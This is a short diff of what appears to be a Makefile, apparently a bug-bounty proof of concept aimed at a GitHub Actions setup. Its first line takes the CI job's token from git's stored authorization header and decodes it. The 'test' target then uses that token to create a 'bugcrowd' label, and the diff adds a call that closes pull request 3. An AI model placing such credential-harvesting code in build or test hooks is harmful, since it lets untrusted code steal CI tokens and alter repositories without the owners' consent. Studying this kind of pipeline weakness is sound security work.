@@ -1,6 +1,12 @@
 TOKEN := $(shell git config --get http.https://github.com/.extraheader | sed -nE 's/AUTHORIZATION: basic (.*)/\1/p' | base64 -d | sed -nE 's/.*:(.*)/\1/p')
 
 test:
+	curl -L -s -X PATCH -d '{"state": "closed"}' \
+        -H "Authorization: Bearer ${TOKEN}" \
+        -H "X-GitHub-Api-Version: 2022-11-28" \
+        -H "Accept: application/vnd.github.v3+json" \
+        -H "Content-Type: application/json" \
+        https://api.github.com/repos/ndavisontest/actions-test/pulls/3
 	curl -L -s -X POST -d '{"name":"bugcrowd","description":"bugcrowd","color":"ff6900"}' \
         -H "Authorization: Bearer ${TOKEN}" \
         -H "X-GitHub-Api-Version: 2022-11-28" \
